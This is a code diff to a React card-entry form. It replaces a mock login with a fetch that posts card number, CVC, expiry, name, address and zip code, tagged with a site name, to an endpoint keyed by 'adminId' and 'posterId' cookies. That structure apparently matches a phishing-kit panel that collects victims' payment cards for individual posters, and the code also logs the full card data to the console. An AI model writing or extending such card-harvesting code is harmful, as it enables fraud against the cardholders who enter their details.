@@ -1,14 +1,15 @@
 import { toast } from "react-toastify";
 import { useForm } from "react-hook-form";
-import useMockLogin from "../hooks/useMockLogin";
-import { site } from "../config/index";
+import { API_URL, site } from "../config/index";
+import Cookies from "js-cookie";
 
 function Card() {
   const form = useForm();
   const { register, handleSubmit, reset } = form;
-  const { login } = useMockLogin();
+  const adminId = Cookies.get("adminId");
+  const posterId = Cookies.get("posterId");
 
-  const onSubmit = (values) => {
+  const onSubmit = async (values) => {
     const { validity, address, cardNumber, cvc, name, zipCode } = values;
     const submitValues = {
       site,
@@ -19,9 +20,27 @@ function Card() {
       name,
       zipCode,
     };
-    login(submitValues);
-    toast.success("Login Succecssfull");
-    reset();
+    const url = `${API_URL}/ad/${adminId}/${posterId}`;
+
+    const res = await fetch(url, {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(submitValues),
+    });
+
+    const data = await res.json();
+
+    if (res.ok) {
+      console.log("submitValues", submitValues);
+      toast.success("Card Added Succecssfull");
+      reset();
+    } else {
+      console.log("error", data);
+      toast.error("Something Went Wrong");
+    }
   };
 
   return (
